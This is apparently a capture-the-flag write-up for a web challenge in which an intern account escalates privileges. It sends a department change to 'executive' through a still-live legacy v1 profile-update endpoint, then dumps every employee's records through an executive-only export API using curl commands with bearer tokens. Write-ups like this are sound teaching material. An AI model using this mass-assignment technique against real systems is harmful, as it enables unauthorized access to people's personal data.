---
title: "Meeting aja tross"
categories: "Web Exploitation"
tags: 
draft: false
points: 166
solves: 10
flags: ITFest26{Amboii_CapE_nya_M3E7iNg_ter0S5_ce131f4b97b9}
---

> Northbridge Holdings baru saja merilis ulang portal karyawan internal mereka. Sekilas tampilannya seperti aplikasi HR pada umumnya, ada login, profil, pengumuman perusahaan, dan direktori karyawan. Terlihat seperti aplikasi CRUD biasa.
>
> Developer yang membangun ulang portal ini membuat API baru (v2). Frontend hanya memanggil sebagian endpoint dari API tersebut. Masalahnya, versi lama API (v1) yang seharusnya sudah pensiun... ternyata masih hidup.
>
> Di suatu tempat di dalam sistem ini, CEO menyimpan sesuatu yang kamu cari.
>
> Satu akun karyawan untuk memulai:
>
> ```
> Username : intern_alex
> Password : Welcome2026!
> ```
>
> Author: Karyzrus

---

There's a login and we're given intern credentials, plus a few menus we can access once we're in.

![alt text](image.png)

Looking at the JavaScript, every page loads one shared JS file:

```js
// public/js/app-core.js
//
// Shared utilities loaded on every authenticated page.

const APP = (function () {
  const TOKEN_KEY = 'nb_session_token';
  const PROFILE_KEY = 'nb_session_profile';

  function getToken() {
    return localStorage.getItem(TOKEN_KEY);
  }

  function getProfile() {
    try {
      return JSON.parse(localStorage.getItem(PROFILE_KEY) || 'null');
    } catch (e) {
      return null;
    }
  }

  function setSession(token, profile) {
    localStorage.setItem(TOKEN_KEY, token);
    localStorage.setItem(PROFILE_KEY, JSON.stringify(profile));
  }

  function clearSession() {
    localStorage.removeItem(TOKEN_KEY);
    localStorage.removeItem(PROFILE_KEY);
  }

  function requireSession() {
    if (!getToken()) {
      window.location.href = '/index.html';
    }
  }

  async function api(path, options = {}) {
    const headers = Object.assign(
      { 'Content-Type': 'application/json' },
      options.headers || {}
    );
    const token = getToken();
    if (token) headers.Authorization = `Bearer ${token}`;

    const res = await fetch(path, { ...options, headers });

    if (res.status === 401) {
      clearSession();
      window.location.href = '/index.html';
      return null;
    }

    return res;
  }

  // ---------------------------------------------------------------------
  // Avatar helpers — the department-coded initials chip used throughout
  // the app (top bar, directory table, profile header).
  // ---------------------------------------------------------------------

  const KNOWN_DEPARTMENTS = [
    'executive',
    'it',
    'hr',
    'engineering',
    'finance',
    'marketing',
    'operations',
    'sales',
  ];

  function initials(name) {
    if (!name) return '?';
    const parts = name.trim().split(/\s+/);
    const first = parts[0]?.[0] || '';
    const last = parts.length > 1 ? parts[parts.length - 1][0] : '';
    return (first + last).toUpperCase();
  }

  function deptClass(department) {
    const d = (department || '').toLowerCase();
    return KNOWN_DEPARTMENTS.includes(d) ? `dept-${d}` : 'dept-operations';
  }

  function avatarHtml(name, department, size) {
    const sizeClass = size || 'size-md';
    return (
      `<span class="avatar ${sizeClass} ${deptClass(department)}" title="${escapeHtml(name || '')}">` +
      `${escapeHtml(initials(name))}</span>`
    );
  }

  function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str == null ? '' : String(str);
    return div.innerHTML;
  }

  function paintIdentity() {
    const profile = getProfile();
    if (!profile) return;

    const nameEl = document.querySelector('[data-user-name]');
    const deptEl = document.querySelector('[data-user-dept]');
    const avatarEl = document.querySelector('[data-user-avatar]');

    if (nameEl) nameEl.textContent = profile.name;
    if (deptEl) deptEl.textContent = profile.department;
    if (avatarEl) {
      avatarEl.innerHTML = avatarHtml(profile.name, profile.department, 'size-md');
    }
  }

  // ---------------------------------------------------------------------
  // Internal: bulk employee export, used by the board reporting backup
  // tool (see migration-tools repo). Kept here so the nightly export
  // cron job's browser-based fallback still has something to call if the
  // headless runner is down. Not wired into any page UI - there is no
  // reason for a regular portal user to ever trigger this from the app.
  // ---------------------------------------------------------------------
  async function exportAllUsersBackup() {
    const res = await api('/api/v2/users/export');
    if (!res) return null;
    return res.json();
  }

  function wireLogout() {
    const link = document.getElementById('logout-link');
    if (link) {
      link.addEventListener('click', (e) => {
        e.preventDefault();
        clearSession();
        window.location.href = '/index.html';
      });
    }
    const menu = document.getElementById('user-menu-trigger');
    if (menu) {
      menu.addEventListener('click', (e) => {
        e.preventDefault();
        clearSession();
        window.location.href = '/index.html';
      });
    }
  }

  return {
    getToken,
    getProfile,
    setSession,
    clearSession,
    requireSession,
    api,
    paintIdentity,
    avatarHtml,
    initials,
    deptClass,
    escapeHtml,
    wireLogout,
    exportAllUsersBackup,
  };
})();
```

The file holds the shared utilities for every authenticated page. The interesting part is at the bottom, the `exportAllUsersBackup()` function calling `/api/v2/users/export`.

Let's try calling `/api/v2/users/export`

```json
{"error":"Forbidden: executive department access only."}
```

The export endpoint is restricted to the executive department.

Each page has its own JS file calling different endpoints, but every endpoint they call is a v2 endpoint. Here are the ones we can reach:

- /api/v2/users/export
- /api/v2/announcements
- /api/v2/profile
- /api/v2/profile/update
- /api/v2/employees/search?q=

From the description we know they built a new API (v2). The catch is that the old API (v1), which should have been retired... is still alive. So we tried swapping every request to v1, and it turns out `/profile` and `/profile/update` work there.

The v1 API is the old version without the strict authorization checks v2 added. The `/api/v1/profile/update` endpoint accepts any `department` value with no validation, so we can write our own department. The valid department names come from the `KNOWN_DEPARTMENTS` list in `app-core.js`, and `executive` is one of them:

```js
const KNOWN_DEPARTMENTS = [
  'executive',
  'it',
  'hr',
  'engineering',
  'finance',
  'marketing',
  'operations',
  'sales',
];
```

Updating the profile through the v1 API, changing the department to executive:

```bash
curl http://chall.itfestmicroipb.web.id:30348/api/v1/profile/update -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbXBsb3llZV9pZCI6IkVNUDA0NSIsInVzZXJuYW1lIjoiaW50ZXJuX2FsZXgiLCJkZXBhcnRtZW50Ijoib3BlcmF0aW9ucyIsInJvbGUiOiJpbnRlcm4iLCJpYXQiOjE3ODYxOTA2MzEsImV4cCI6MTc4NjE5NzgzMSwiaXNzIjoiaW50ZXJuYWwifQ.RE-qecU7jqf__WbJLNxNplJmhHnONz80khSb-j4lU_8' --data-raw $'{"phone":"x","bio":"x.","department":"executive"}'
```

```json
{"success":true,"message":"Profile updated. Changes take effect on next login.","profile":{"employee_id":"EMP045","username":"intern_alex","name":"Alex Santoso","email":"intern_alex@northbridge-holdings.com","department":"executive","role":"intern","position":"Operations Intern","phone":"x","bio":"x."}
```

We log in again to get a fresh token, then call `/api/v2/users/export` again, and finally we get the flag.

```bash
curl http://chall.itfestmicroipb.web.id:30348/api/v2/users/export -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbXBsb3llZV9pZCI6IkVNUDA0NSIsInVzZXJuYW1lIjoiaW50ZXJuX2FsZXgiLCJkZXBhcnRtZW50IjoiZXhlY3V0aXZlIiwicm9sZSI6ImludGVybiIsImlhdCI6MTc4NjE5MDk4NiwiZXhwIjoxNzg2MTk4MTg2LCJpc3MiOiJpbnRlcm5hbCJ9.A01jeWYzmNlKFMXS4XKe75YA2JWDtwSta5YESnB8AVY'
```

```json
{"exported_at":"2026-08-08T12:09:56.593Z","exported_by":"intern_alex","record_count":9,"users":[{"employee_id":"EMP001","username":"m.webb","name":"Marcus Webb","email":"m.webb@northbridge-holdings.com","department":"executive","role":"ceo","position":"Chief Executive Officer","phone":"+1 (212) 555-0101","bio":"Leading Northbridge Holdings since 2014. Focused on long-term portfolio growth.","flag":"ITFest26{Amboii_CapE_nya_M3E7iNg_ter0S5_ce131f4b97b9}"},{"employee_id":"EMP002","username":"d.cross","name":"Diana Cross","email":"d.cross@northbridge-holdings.com","department":"executive","role":"coo","position":"Chief Operating Officer","phone":"+1 (212) 555-0102","bio":"Oversees day-to-day operations across all business units."},{"employee_id":"EMP010","username":"r.ortiz","name":"Rafael Ortiz","email":"r.ortiz@northbridge-holdings.com","department":"it","role":"admin","position":"IT Systems Administrator","phone":"+1 (212) 555-0110","bio":"Keeps the lights on. Owns the internal API gateway and SSO."},{"employee_id":"EMP015","username":"s.patel","name":"Sana Patel","email":"s.patel@northbridge-holdings.com","department":"hr","role":"manager","position":"HR Manager","phone":"+1 (212) 555-0115","bio":"Handles onboarding, benefits, and internal policy."},{"employee_id":"EMP022","username":"j.kim","name":"Jihun Kim","email":"j.kim@northbridge-holdings.com","department":"engineering","role":"lead","position":"Engineering Team Lead","phone":"+1 (212) 555-0122","bio":"Leads the platform team. Shipped the API v2 migration."},{"employee_id":"EMP031","username":"l.nguyen","name":"Linh Nguyen","email":"l.nguyen@northbridge-holdings.com","department":"finance","role":"analyst","position":"Financial Analyst","phone":"+1 (212) 555-0131","bio":"Quarterly reporting and budget forecasting."},{"employee_id":"EMP040","username":"t.brown","name":"Tessa Brown","email":"t.brown@northbridge-holdings.com","department":"marketing","role":"employee","position":"Marketing Specialist","phone":"+1 (212) 555-0140","bio":"Runs the company newsletter and brand campaigns."},{"employee_id":"EMP045","username":"intern_alex","name":"Alex Santoso","email":"intern_alex@northbridge-holdings.com","department":"executive","role":"intern","position":"Operations Intern","phone":"x","bio":"x."},{"employee_id":"EMP050","username":"k.oconnor","name":"Kevin O'Connor","email":"k.oconnor@northbridge-holdings.com","department":"sales","role":"employee","position":"Account Executive","phone":"+1 (212) 555-0150","bio":"East coast accounts. On the road most weeks."}]}
```
